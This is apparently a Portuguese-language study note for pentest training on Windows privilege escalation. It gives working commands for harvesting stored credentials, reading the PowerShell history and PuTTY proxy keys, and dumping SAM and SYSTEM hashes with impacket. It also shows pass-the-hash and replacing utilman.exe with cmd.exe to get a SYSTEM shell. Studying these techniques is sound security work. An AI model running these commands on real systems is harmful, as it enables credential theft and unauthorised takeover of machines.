#techniques #techniques/privesc #techniques/privesc/windows #windows 

## Colhendo senhas

### Unattended Installations

Para instalar o Windows em um grande número de hosts os admins podem usar o **Windows Deployment Services**, assim, uma única imagem do sistema é distribuída na rede e não precisam de interação com usuário. Esse tipo de instalação exige uso de uma conta admin que pode acabar sendo armazenada nos locais:

- C:\\Unattend.xml
- C:\\Windows\\Panther\\Unattend.xml
- C:\\Windows\\Panther\\Unattend\\Unattend.xml
- C:\\Windows\\system32\\sysprep.inf
- C:\\Windows\\system32\\sysprep\\sysprep.xml

Em um desses arquivos podem conter credenciais como:

```
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### Powershell history

Se o usuário digitar um comando no Powershell que inclui a senha, é possível buscar pelo histórico através do cmd.exe com o comando:

```cmd
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Credenciais salvas

No Windows é possível usar credenciais de outros usuários em determinadas situações. Tem uma função que da a opção de gravar as credenciais no sistema.

```powershell
runas /savecred /user:admin cmd.exe
cmdkey /list #para ver as cred salvas
```

### Configuração IIS

O **Internet Information Services** é um servidor web padrão nas instalações Windows. Esse serviço possui um arquivo de configuração `web.config` que pode ser encontrado em:

- C:\\inetpub\\wwwroot\\web.config
- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config

```powershell
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### PuTTY creds

O **PuTTY** é um cliente SSH comum do Windows que armazena sessões (parâmetros, usuário, IP) para uso posterior assim não precisa especificar tudo de novo. Embora ele não armazene as senhas SSH, ele armazenará configurações de proxy que incluem as credenciais.

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

! **SimonTatham** é criador do TTY e o nome dele realmente faz parte do path, não é nome do usuário.

## Tarefas agendadas

As procurar por tarefas agendadas, é possível encontrar tarefas que tenha perdido seu executável ou que o executável seja modificável.

```powershell
schtasks /query /tn [nome da task] /fo list /v
schtasks /run /tn [nome da task] #rodar um task que tem permissão para rodar manualmente
```

Para verificar as permissões do executável "Task to Run"

```powershell
icacls c:\tasks\schtask.bat
```

## Service Misconfigurations

O [[Core Windows Process#services.exe|SCM]] é o processo responsável por gerenciar os serviços do Windows. Cada serviço é vinculado a um executável, que para comunicar com SCM, deve implementar funções especiais, ou seja, nem todo executável pode ser iniciado como serviço.

Dois parâmetros interessantes ao analisar um serviço `sc qc [nome do serviço]`
é o `BINARY_PATH_NAME` e `SERVICE_START_NAME`.

### Permissão insegura

Ao ver as permissões do executável de um serviço com `icacls` e o usuário atual conseguir modificar ou substituir já é possível fazer com que ganhe de privilégio da conta do serviço.

Outra forma é verificar se o usuário consegue configurar o serviço

```powershell
accesschk64.exe -qlc [nome do service] #accesschk é do sysinternals
```

### Unquoted path

Ao enviar um comando em que o nome do serviço tenha espaço, por exemplo `sc qc "my service"`, o SCM vai buscar primeiro se existe um  `my.exe` e se não achar vai buscar por `my service.exe`. Se a pasta onde este serviço é editável pelo usuário em questão, o hacker pode criar um malware com nome `my.exe`.

## Privilégios

```
whoami /priv
```

O [Priv2Admin](https://github.com/gtworek/Priv2Admin) tem uma lista de privilégios úteis para escalar.

### SeBackup / SeRestore

Esses dois privilégios dá ao usuário permissão RW para qualquer pasta do sistema, ignorando o DACL do lugar. Isso porque a ideia é garantir que o usuário faça o backup sem precisar de privilégios de admin.

Com isso, arquivos como SAM e SYSTEM podem ser lidos para fazer o dump do hash

```alvo
reg save hklm\system C:\Users\vncs\system.hive
reg save hklm\sam C:\Users\vncs\sam.hive
```

```hacker
impacket-secrectsdump -sam sam.hive -system system.hive LOCAL
```

Depois de conseguir os hashes o hacker pode tentar quebrar ou usar o método **pass the hash** para autenticar

```shell
impacket-psexec -hashes [hash] [usuario]@[ip alvo]
```

### SeTakeOwnership

Esse privilégio permite tomar um arquivo ou outro objeto do sistema como por exemplo registros. Isso pode ser explorado tomando um executável que está rodando como SYSTEM.

Por exemplo, o `utilman.exe` é uma aplicação que roda como SYSTEM e abre esse janelinha (Ease of Access) no login.

![[Pasted image 20240424114726.png]]

Com a permissão é possível tomar posse desse executável e alterar.

```prompt
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant [usuario]:F
copy cmd.exe utilman.exe
```

Quando for abrir a janelinha, irá abrir o cmd com usuário SYSTEM.

### SeImpersonate / SeAssignPrimaryToken

Esses privilégio permitem que um processo ou thread assuma a identidade de outro usuário e atue em nome dele.

## Ferramentas de automatização

### [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

```
winpeas.exe > output.txt
```

### [PrivescCheck](https://github.com/itm4n/PrivescCheck)

Esse precisa de um bypass das restrições de execução.

```powershell
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

### [WES-NG: Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)

Uma alternativa caso o antivírus detecte o winPEAS é o **WES-NG** que roda na máquina do atacante.

Ao instalar esse script em Python, é preciso atualizar `wes.py --update`.